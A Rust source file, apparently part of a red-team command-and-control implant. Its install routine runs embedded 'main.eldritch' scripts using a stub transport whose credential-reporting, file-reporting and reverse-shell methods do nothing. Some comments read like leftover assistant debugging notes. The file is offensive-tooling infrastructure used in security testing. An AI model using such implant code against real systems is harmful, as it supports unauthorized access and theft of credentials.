use anyhow::{anyhow, Result};
#[cfg(debug_assertions)]
#[allow(unused_imports)]
use std::fmt::Write;
use crate::task::TaskHandle;
use pb::config::Config;
use transport::Transport;

#[derive(rust_embed::RustEmbed)]
#[folder = "assets/"]
struct Asset;

pub async fn install() {
    #[cfg(debug_assertions)]
    log::info!("starting installation");

    // Iterate through all embedded files
    for embedded_file_path in Asset::iter() {
        let filename = embedded_file_path.split('/').next_back().unwrap_or("");

        #[cfg(debug_assertions)]
        log::debug!("checking asset {embedded_file_path}");

        // Evaluate all "main.eldritch" files
        if filename == "main.eldritch" {
            // Read eldritch content from embedded file
            #[cfg(debug_assertions)]
            log::info!("loading tome {embedded_file_path}");
            let eldritch_content = match load_embedded_eldritch(embedded_file_path.to_string()) {
                Ok(content) => content,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to load install asset: {_err}");

                    continue;
                }
            };

            // Run tome using TaskHandle logic
            #[cfg(debug_assertions)]
            log::info!("running tome {embedded_file_path}");

            let mut handle = TaskHandle::new(0, eldritch_content);

            #[derive(Clone)]
            struct LogTransport;

            // Manual implementation of the generated trait methods to match lifetimes?
            // `async_trait` macro handles lifetimes usually.
            // The error says lifetimes do not match.
            // This happens if the trait definition has specific lifetime bounds that I am missing or `async_trait` generates slightly different signatures.
            // The `transport` crate defines `Transport` via `trait_variant::make(Transport: Send)`.
            // This generates `Transport` which returns `impl Future`.
            // So `async_trait` macro might not be compatible if `Transport` is not an `async_trait` trait.
            // `trait_variant` generates synchronous functions returning futures.
            // I should implement it manually without `async_trait`.

            impl Transport for LogTransport {
                 fn init() -> Self { LogTransport }
                 fn new(_uri: String, _proxy_uri: Option<String>) -> Result<Self> { Ok(LogTransport) }

                 fn claim_tasks(&mut self, _req: pb::c2::ClaimTasksRequest) -> impl std::future::Future<Output = Result<pb::c2::ClaimTasksResponse>> + Send {
                     async { Ok(pb::c2::ClaimTasksResponse::default()) }
                 }

                 fn fetch_asset(&mut self, _req: pb::c2::FetchAssetRequest, _tx: std::sync::mpsc::Sender<pb::c2::FetchAssetResponse>) -> impl std::future::Future<Output = Result<()>> + Send {
                     async { Ok(()) }
                 }

                 fn report_credential(&mut self, _req: pb::c2::ReportCredentialRequest) -> impl std::future::Future<Output = Result<pb::c2::ReportCredentialResponse>> + Send {
                     async { Ok(pb::c2::ReportCredentialResponse::default()) }
                 }

                 fn report_file(&mut self, _req: std::sync::mpsc::Receiver<pb::c2::ReportFileRequest>) -> impl std::future::Future<Output = Result<pb::c2::ReportFileResponse>> + Send {
                     async { Ok(pb::c2::ReportFileResponse::default()) }
                 }

                 fn report_process_list(&mut self, _req: pb::c2::ReportProcessListRequest) -> impl std::future::Future<Output = Result<pb::c2::ReportProcessListResponse>> + Send {
                     async { Ok(pb::c2::ReportProcessListResponse::default()) }
                 }

                 fn report_task_output(&mut self, req: pb::c2::ReportTaskOutputRequest) -> impl std::future::Future<Output = Result<pb::c2::ReportTaskOutputResponse>> + Send {
                     async move {
                         if let Some(output) = req.output {
                             #[cfg(debug_assertions)]
                             if !output.output.is_empty() {
                                 log::info!("{}", output.output);
                             }
                             #[cfg(debug_assertions)]
                             if let Some(err) = output.error {
                                 log::error!("{}", err.msg);
                             }
                         }
                         Ok(pb::c2::ReportTaskOutputResponse::default())
                     }
                 }

                 fn reverse_shell(&mut self, _rx: tokio::sync::mpsc::Receiver<pb::c2::ReverseShellRequest>, _tx: tokio::sync::mpsc::Sender<pb::c2::ReverseShellResponse>) -> impl std::future::Future<Output = Result<()>> + Send {
                     async { Ok(()) }
                 }
            }

            let mut t = LogTransport;
            let cfg = Config::default(); // Dummy config

            loop {
                let _ = handle.report(&mut t, cfg.clone()).await;
                if handle.is_finished() {
                    break;
                }
                tokio::time::sleep(std::time::Duration::from_millis(100)).await;
            }
        }
    }
}

fn load_embedded_eldritch(path: String) -> Result<String> {
    match Asset::get(path.as_ref()) {
        Some(f) => Ok(String::from_utf8_lossy(&f.data).to_string()),
        None => {
            #[cfg(debug_assertions)]
            log::error!("no asset file at {}", path);

            Err(anyhow!("no asset file at {}", path))
        }
    }
}
